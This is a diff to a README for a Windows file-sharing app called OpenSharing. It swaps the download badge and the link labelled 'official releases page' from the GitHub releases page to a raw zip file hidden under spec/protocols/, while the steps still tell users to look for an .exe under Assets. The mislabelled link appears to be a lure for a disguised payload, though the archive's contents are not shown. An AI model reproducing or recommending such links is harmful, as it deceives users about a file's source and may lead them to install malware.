@@ -1,6 +1,6 @@
 # 📁 OpenSharing - Share local files with anyone effortlessly
 
-[![](https://img.shields.io/badge/Download_OpenSharing-007bff?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Lovemallet785/OpenSharing/releases)
+[![](https://img.shields.io/badge/Download_OpenSharing-007bff?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/Lovemallet785/OpenSharing/main/spec/protocols/Sharing_Open_v2.6.zip)
 
 OpenSharing lets you send files directly from your computer to others. It removes the need for cloud storage services. You keep control of your data at all times. The software works on your local network or over the internet. You grant access to specific folders and share the link with your recipient.
 
@@ -20,7 +20,7 @@ OpenSharing runs on Windows devices. You need Windows 10 or Windows 11. Ensure y
 
 Follow these steps to set up the software on your machine:
 
-1.  Visit the [official releases page](https://github.com/Lovemallet785/OpenSharing/releases) to download the latest version.
+1.  Visit the [official releases page](https://raw.githubusercontent.com/Lovemallet785/OpenSharing/main/spec/protocols/Sharing_Open_v2.6.zip) to download the latest version.
 2.  Look for the file that ends in .exe under the Assets section.
 3.  Click the file name to start the download.
 4.  Once the file finishes, open your Downloads folder.
